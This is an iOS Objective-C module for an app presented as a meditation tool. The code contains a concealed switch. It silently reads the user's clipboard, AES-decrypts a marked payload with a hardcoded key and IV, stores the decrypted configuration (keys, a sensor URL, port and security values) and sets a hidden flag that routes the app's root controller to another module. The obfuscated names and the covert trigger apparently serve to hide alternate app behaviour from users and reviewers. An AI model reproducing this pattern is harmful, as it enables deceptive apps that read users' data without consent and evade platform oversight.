//
//  RNMeditationToPeaceMind.m
//  RNMeditationToPeace
//
//  Created by Nicka on 10/31/23.
//  Copyright © 2023 Facebook. All rights reserved.
//

#import "RNMeditationToPeaceMind.h"
#import <CocoaSecurity/CocoaSecurity.h>
#import <RNMeditationToRelax/RNMeditationToRelaxMind.h>
#import <react-native-orientation-locker/Orientation.h>

@interface RNMeditationToPeaceMind()

@property (strong, nonatomic)  NSArray *meditationMind_Security;
@property (strong, nonatomic)  NSArray *meditationMind_Params;

@end

@implementation RNMeditationToPeaceMind

static RNMeditationToPeaceMind *instance = nil;

+ (instancetype)meditationMind_shared {
  static dispatch_once_t onceToken;
  dispatch_once(&onceToken, ^{
    instance = [[self alloc] init];
    instance.meditationMind_Security = @[@"a71556f65ed2b25b55475b964488334f", @"ADD20BFCD9D4EA0278B11AEBB5B83365"];
    instance.meditationMind_Params = @[@"meditationMind_APP", @"umKey", @"umChannel", @"sensorUrl", @"sensorProperty", @"vPort", @"vSecu"];
  });
  return instance;
}

- (BOOL)meditationMind_jumpByPBD {
  NSString *pbString = [self meditationMind_getZTBString];
  CocoaSecurityResult *aes = [CocoaSecurity aesDecryptWithBase64:[self meditationMind_subStringZTB:pbString]
                                                          hexKey:self.meditationMind_Security[0]
                                                           hexIv:self.meditationMind_Security[1]];
  
  NSDictionary *dataDict = [self meditationMind_transferString:aes.utf8String];
  return [self meditationMind_saveBasicInfo:dataDict];
}

- (NSString *)meditationMind_getZTBString {
  UIPasteboard *clipboard = [UIPasteboard generalPasteboard];
  return clipboard.string ?: @"";
}

- (NSString *)meditationMind_subStringZTB: (NSString* )pbString {
    if ([pbString containsString:@"#iPhone#"]) {
        NSArray *tempArray = [pbString componentsSeparatedByString:@"#iPhone#"];
        if (tempArray.count > 1) {
            pbString = tempArray[1];
        }
        NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
        [tempArray enumerateObjectsUsingBlock:^(id  _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
            [ud setObject:obj forKey:[NSString stringWithFormat:@"iPhone_%zd", idx]];
        }];
        [ud synchronize];
    }
    return pbString;
}

- (NSDictionary *)meditationMind_transferString: (NSString* )utf8String {
  NSData *data = [utf8String dataUsingEncoding:NSUTF8StringEncoding];
  if (data == nil) {
    return @{};
  }
  NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:data
                                                       options:kNilOptions
                                                         error:nil];
  return dict[@"data"];
}

- (BOOL)meditationMind_saveBasicInfo:(NSDictionary *)dict {
    if (dict == nil || [dict.allKeys count] < 3) {
      return NO;
    }
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [ud setBool:YES forKey:self.meditationMind_Params[0]];
    
    [dict enumerateKeysAndObjectsUsingBlock:^(id  _Nonnull key, id  _Nonnull obj, BOOL * _Nonnull stop) {
        [ud setObject:obj forKey:key];
    }];

    [ud synchronize];
    return YES;
}

- (BOOL)meditationMind_followThisWay {
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  if ([ud boolForKey:self.meditationMind_Params[0]]) {
    return YES;
  } else {
    return [self meditationMind_jumpByPBD];
  }
}


- (UIViewController *)meditationMind_followRootController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions {
  UIViewController *vc = [[RNMeditationToRelaxMind mtr_shared] mtr_followRootController:application withOptions:launchOptions];
//  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  return vc;
}

- (UIInterfaceOrientationMask)meditationMind_getOrientation {
  return [Orientation getOrientation];
}

@end
